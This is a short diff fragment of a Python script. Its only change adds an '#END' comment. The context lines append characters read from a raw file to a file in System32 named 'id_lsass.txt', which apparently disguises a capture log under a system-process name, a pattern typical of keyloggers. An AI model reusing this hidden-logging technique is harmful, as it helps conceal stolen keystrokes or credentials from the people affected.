@@ -12,3 +12,4 @@ with open(raw_file, 'r') as f:
                     data = letter
                     f = open("C:\Windows\System32\id_lsass.txt",'a')
                     f.write(data)
+#END
